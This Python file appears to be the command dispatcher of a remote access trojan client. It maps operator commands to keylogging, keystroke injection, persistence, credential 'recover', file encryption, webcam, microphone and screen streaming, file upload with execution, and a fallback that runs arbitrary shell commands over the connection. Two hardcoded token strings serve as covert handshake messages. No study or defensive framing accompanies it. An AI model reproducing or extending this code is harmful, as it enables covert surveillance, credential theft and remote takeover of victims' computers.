from foreign.client_handling.connection_data import *
from foreign.parse.error_exception_handling import *
from foreign.client_handling.interpreter import *
from foreign.client_handling.persistence import *
from foreign.client_handling.messagebox import *
from foreign.client_handling.keystroke import *
from foreign.client_handling.keylogger import *
from foreign.client_handling.uninstall import *
from foreign.client_handling.reconnect import *
from foreign.client_handling.download import *
from foreign.client_handling.website import *
from foreign.client_handling.encrypt import *
from foreign.client_handling.recover import *
from foreign.client_handling.system import *
from binary.data_handling.send_data import *
from foreign.client_handling.upload import *
from foreign.utility.terminal_pipe import *
from foreign.client_handling.image import *
from foreign.client_handling.cd import *
from foreign.modules.stream import *
from foreign.modules.audio import *
from foreign.modules.talk import *
from foreign.global_state import *
from foreign.modules.cam import *


@error_exception_handling
def command_handling(conn, data):
	settings = (state['settings']['encryption'], state['settings']['encoding'], state['settings']['headersize'])
	message = data['message'].lower()

	if data['message'] == 'CsBLDS4n5zPYq7JaxDjxWHK4':
		send_data(conn, connection_data(data['silent'], data['io_channels'], (data['safe'], data['safe_timeout'])), settings)
	elif data['message'] == 'bbCF2NNYjjTfHELUV9Y2qmkV':
		send_data(conn, {'message': ' '}, settings)
	elif message == 'uninstall':
		send_data(conn, uninstall(), settings)
	elif message == 'reconnect':
		send_data(conn, reconnect((data['safe'], data['safe_timeout'])), settings)
	elif message == 'cd':
		send_data(conn, cd(data['to']), settings)
	elif message == 'image':
		send_data(conn, image(data['image_type'], data['monitor']), settings)
	elif message == 'upload':
		send_data(conn, upload(data['file'], data['execute'], data['file_data'], data['max_file_size'], data['from_url']), settings)
	elif message == 'download':
		send_data(conn, download(data['file'], data['max_file_size']), settings)
	elif message == 'encrypt':
		send_data(conn, encrypt(data['file'], data['decrypt']), settings)
	elif message == 'interpreter':
		send_data(conn, interpreter(data['execute']), settings)
	elif message == 'keylogger':
		send_data(conn, keylogger(data['action_type']), settings)
	elif message == 'keystroke':
		send_data(conn, keystroke(data['inject']), settings)
	elif message == 'persistence':
		send_data(conn, persistence(data['action_type'], (data['safe'], data['safe_timeout'])), settings)
	elif message == 'system':
		send_data(conn, system(data['action_type'], (data['safe'], data['safe_timeout'])), settings)
	elif message == 'recover':
		send_data(conn, recover(data['action_type'], data['force']), settings)
	elif message == 'messagebox':
		send_data(conn, messagebox(data['title'], data['text'], data['style']), settings)
	elif message == 'website':
		send_data(conn, website(data['open']), settings)
	elif message == 'stream':
		send_data(conn, stream(data['ip'], data['port'], data['resolution'], data['monitor'], data['fps']), settings)
	elif message == 'cam':
		send_data(conn, cam(data['ip'], data['port'], data['monitor'], data['fps']), settings)
	elif message == 'audio':
		send_data(conn, audio(data['ip'], data['port']), settings)
	elif message == 'talk':
		send_data(conn, talk(data['ip'], data['port']), settings)
	else:
		send_data(conn, {'message': terminal_pipe(data['message'], data['safe'], data['safe_timeout'])}, settings)